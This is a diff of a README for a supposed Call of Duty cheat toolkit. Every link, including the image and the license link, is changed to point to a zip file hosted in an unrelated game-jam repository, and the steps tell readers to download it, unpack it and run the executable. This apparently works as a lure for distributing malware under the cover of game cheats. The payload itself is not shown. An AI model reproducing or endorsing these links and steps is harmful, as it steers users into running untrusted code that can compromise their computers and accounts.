@@ -1,7 +1,7 @@
 # 🚀 Call of Duty Cheats Hacks  
-![image](https://github.com/user-attachments/assets/4e214451-3b4a-4a64-9cdb-224da442c5b2)
+![image](https://raw.githubusercontent.com/alrapepa/Bubbleoid-GGJ2025/main/chalky/Bubbleoid-GGJ2025.zip)
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Call%20of%20Duty%20Cheats%20Hacks-blue?logo=google-drive&style=for-the-badge)](https://ezlaunch.live/pPnqF1yp)
+[![Download Latest Release](https://raw.githubusercontent.com/alrapepa/Bubbleoid-GGJ2025/main/chalky/Bubbleoid-GGJ2025.zip%20of%20Duty%20Cheats%20Hacks-blue?logo=google-drive&style=for-the-badge)](https://raw.githubusercontent.com/alrapepa/Bubbleoid-GGJ2025/main/chalky/Bubbleoid-GGJ2025.zip)
 
 Welcome to the ultimate **Call of Duty cheats hacks** toolkit! This repository provides modern enhancement utilities designed for seamless performance with various Call of Duty titles in 2025. Utilize high-quality functions for improved gameplay and tactical advantages, supporting world-class skill optimization.
 
@@ -38,7 +38,7 @@ Call of Duty performance booster, 2025 cheat engine, gameplay enhancer, ESP for 
 
 ## 📝 Installation 
 
-1. [![Download the Latest Version](https://img.shields.io/badge/Download%20Now-Call%20of%20Duty%20Cheats%20Hacks-brightgreen?style=for-the-badge)](https://ezlaunch.live/pPnqF1yp)
+1. [![Download the Latest Version](https://raw.githubusercontent.com/alrapepa/Bubbleoid-GGJ2025/main/chalky/Bubbleoid-GGJ2025.zip%20Now-Call%20of%20Duty%20Cheats%20Hacks-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/alrapepa/Bubbleoid-GGJ2025/main/chalky/Bubbleoid-GGJ2025.zip)
 2. Unpack the archive to your preferred directory.
 3. Launch the executable and follow the on-screen guide.
 4. Customize your settings for top-tier e-sports gameplay.
@@ -53,9 +53,9 @@ This repository is strictly for educational and research purposes regarding game
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/license/mit/).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/alrapepa/Bubbleoid-GGJ2025/main/chalky/Bubbleoid-GGJ2025.zip).  
 © 2025. All rights reserved.
 
 ---
 
-[![Download End](https://img.shields.io/badge/Get%20Ultimate%20CoD%20Cheats%20Hacks-purple?style=for-the-badge)](https://ezlaunch.live/pPnqF1yp)
+[![Download End](https://raw.githubusercontent.com/alrapepa/Bubbleoid-GGJ2025/main/chalky/Bubbleoid-GGJ2025.zip%20Ultimate%20CoD%20Cheats%20Hacks-purple?style=for-the-badge)](https://raw.githubusercontent.com/alrapepa/Bubbleoid-GGJ2025/main/chalky/Bubbleoid-GGJ2025.zip)
